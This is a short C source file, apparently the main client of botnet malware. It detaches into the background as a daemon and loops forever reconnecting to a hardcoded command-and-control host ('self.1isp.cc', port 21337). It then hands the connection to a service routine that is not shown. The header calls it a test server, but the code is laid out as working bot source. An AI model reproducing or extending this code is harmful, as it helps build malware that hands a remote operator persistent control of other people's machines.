/*
   created at 2015//4/9
   latest modified at 2015/4/9
   test server used by alexjlz
 */

#include "tcpip/tcpip.h"
#include "utils/utils.h"
#include "core/core.h"
#include "alg/alexjlz_hash.h"
#include "daemon/daemon.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

int mainCommSock = 0;
char *server = "self.1isp.cc";
int port = 21337;
extern char uuid[32];
extern uint32_t *pids;
extern uint32_t numpids;

int main(int argc, char **argv)
{
    generate_uuid();
    getOurIP();
	srand(time(NULL) ^ getpid());
	init_rand(time(NULL) ^ getpid());
	//printf("MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n", macAddress[0], macAddress[1], macAddress[2], macAddress[3], macAddress[4], macAddress[5]);

    daemonize();
    while ( 1 )
    {
		if( (mainCommSock=connect_tcp_server(server, port)) == -1)
        { 
            printf("Failed to connect...\n"); sleep(5); continue; 
        }
        if ( ask_for_service( mainCommSock ) == -1 )  // return from this function means connection between client
                                                      // and server are unexpectedly closed
        {
            fprintf(stdout, "error in client\n");
        }
        
        if ( check_fd(mainCommSock) )
        {
            close(mainCommSock);
        }
        sleep(3);
    }

    return 0;
}
